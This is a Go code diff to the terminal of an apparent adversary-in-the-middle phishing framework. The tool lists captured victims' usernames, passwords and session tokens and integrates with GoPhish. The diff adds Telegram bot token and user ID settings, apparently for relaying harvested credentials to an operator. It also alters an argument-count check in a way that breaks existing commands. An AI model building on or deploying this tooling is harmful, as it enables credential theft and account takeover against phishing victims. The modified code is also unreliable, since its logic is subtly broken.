@@ -41,6 +41,7 @@ type Terminal struct {
 	db        *database.Database
 	hlp       *Help
 	developer bool
+	DB        *database.Database // Ensure this field exists and is properly initialized
 }
 
 func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Database, developer bool) (*Terminal, error) {
@@ -51,6 +52,7 @@ func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Databas
 		p:         p,
 		db:        db,
 		developer: developer,
+		DB:        db, // Initialize the DB field
 	}
 
 	t.createHelp()
@@ -192,8 +194,8 @@ func (t *Terminal) handleConfig(args []string) error {
 			gophishInsecure = "true"
 		}
 
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "gophish admin_url", "gophish api_key", "gophish insecure"}
-		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure}
+		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot token", "telegram user id"}
+		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramUserID()}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -238,8 +240,26 @@ func (t *Terminal) handleConfig(args []string) error {
 				}
 				return nil
 			}
+		case "telegram":
+			if args[1] == "bot" && pn == 4 {
+				switch args[2] {
+				case "token":
+					t.cfg.SetTelegramBotToken(args[3])
+					t.cfg.SaveTelegramConfig()
+					log.Info("Telegram bot token set")
+					return nil
+				}
+			} else if args[1] == "user" && pn == 4 {
+				switch args[2] {
+				case "id":
+					t.cfg.SetTelegramUserID(args[3])
+					t.cfg.SaveTelegramConfig()
+					log.Info("Telegram user ID set")
+					return nil
+				}
+			}
 		}
-	} else if pn == 3 {
+	} else if pn == 4 {
 		switch args[0] {
 		case "ipv4":
 			switch args[1] {
@@ -259,12 +279,26 @@ func (t *Terminal) handleConfig(args []string) error {
 				t.cfg.SetGoPhishApiKey(args[2])
 				return nil
 			case "insecure":
+				insecure, err := strconv.ParseBool(args[2])
+				if err != nil {
+					return err
+				}
+				t.cfg.SetGoPhishInsecureTLS(insecure)
+				return nil
+			}
+		case "telegram":
+			if args[1] == "bot" {
 				switch args[2] {
-				case "true":
-					t.cfg.SetGoPhishInsecureTLS(true)
+				case "token":
+					t.cfg.SetTelegramBotToken(args[3])
+					log.Info("Telegram bot token set")
 					return nil
-				case "false":
-					t.cfg.SetGoPhishInsecureTLS(false)
+				}
+			} else if args[1] == "user" {
+				switch args[2] {
+				case "id":
+					t.cfg.SetTelegramUserID(args[3])
+					log.Info("Telegram user ID set")
 					return nil
 				}
 			}
@@ -399,7 +433,7 @@ func (t *Terminal) handleSessions(args []string) error {
 	pn := len(args)
 	if pn == 0 {
 		cols := []string{"id", "phishlet", "username", "password", "tokens", "remote ip", "time"}
-		sessions, err := t.db.ListSessions()
+		sessions, err := t.DB.ListSessions()
 		if err != nil {
 			return err
 		}
@@ -423,7 +457,7 @@ func (t *Terminal) handleSessions(args []string) error {
 		if err != nil {
 			return err
 		}
-		sessions, err := t.db.ListSessions()
+		sessions, err := t.DB.ListSessions()
 		if err != nil {
 			return err
 		}
@@ -496,7 +530,7 @@ func (t *Terminal) handleSessions(args []string) error {
 		switch args[0] {
 		case "delete":
 			if args[1] == "all" {
-				sessions, err := t.db.ListSessions()
+				sessions, err := t.DB.ListSessions()
 				if err != nil {
 					return err
 				}
@@ -504,14 +538,14 @@ func (t *Terminal) handleSessions(args []string) error {
 					break
 				}
 				for _, s := range sessions {
-					err = t.db.DeleteSessionById(s.Id)
+					err = t.DB.DeleteSessionById(s.Id)
 					if err != nil {
 						log.Warning("delete: %v", err)
 					} else {
 						log.Info("deleted session with ID: %d", s.Id)
 					}
 				}
-				t.db.Flush()
+				t.DB.Flush()
 				return nil
 			} else {
 				rc := strings.Split(args[1], ",")
@@ -530,7 +564,7 @@ func (t *Terminal) handleSessions(args []string) error {
 							break
 						}
 						for i := b_id; i <= e_id; i++ {
-							err = t.db.DeleteSessionById(i)
+							err = t.DB.DeleteSessionById(i)
 							if err != nil {
 								log.Warning("delete: %v", err)
 							} else {
@@ -543,7 +577,7 @@ func (t *Terminal) handleSessions(args []string) error {
 							log.Error("delete: %v", err)
 							break
 						}
-						err = t.db.DeleteSessionById(b_id)
+						err = t.DB.DeleteSessionById(b_id)
 						if err != nil {
 							log.Warning("delete: %v", err)
 						} else {
@@ -551,7 +585,7 @@ func (t *Terminal) handleSessions(args []string) error {
 						}
 					}
 				}
-				t.db.Flush()
+				t.DB.Flush()
 				return nil
 			}
 		}
@@ -1161,9 +1195,11 @@ func (t *Terminal) createHelp() {
 	h, _ := NewHelp()
 	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
 		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
-			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test"))))
+			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
+			readline.PcItem("telegram", readline.PcItem("bot", readline.PcItem("token")), readline.PcItem("user", readline.PcItem("id")))))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
 	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
+
 	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ipv4_address>", "set ipv4 external address of the current server")
 	h.AddSubCommand("config", []string{"ipv4", "external"}, "ipv4 external <ipv4_address>", "set ipv4 external address of the current server")
 	h.AddSubCommand("config", []string{"ipv4", "bind"}, "ipv4 bind <ipv4_address>", "set ipv4 bind address of the current server")
@@ -1173,9 +1209,12 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"gophish", "api_key"}, "gophish api_key <key>", "set up the api key for the gophish instance to communicate with")
 	h.AddSubCommand("config", []string{"gophish", "insecure"}, "gophish insecure <true|false>", "enable or disable the verification of gophish tls certificate (set to `true` if using self-signed certificate)")
 	h.AddSubCommand("config", []string{"gophish", "test"}, "gophish test", "test the gophish configuration")
+	h.AddSubCommand("config", []string{"telegram", "bot", "token"}, "telegram bot token <token>", "set the Telegram bot token")
+	h.AddSubCommand("config", []string{"telegram", "user", "id"}, "telegram user id <id>", "set the Telegram user ID")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
 		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
+
 	h.AddSubCommand("proxy", nil, "", "show all configuration variables")
 	h.AddSubCommand("proxy", []string{"enable"}, "enable", "enable proxy")
 	h.AddSubCommand("proxy", []string{"disable"}, "disable", "disable proxy")
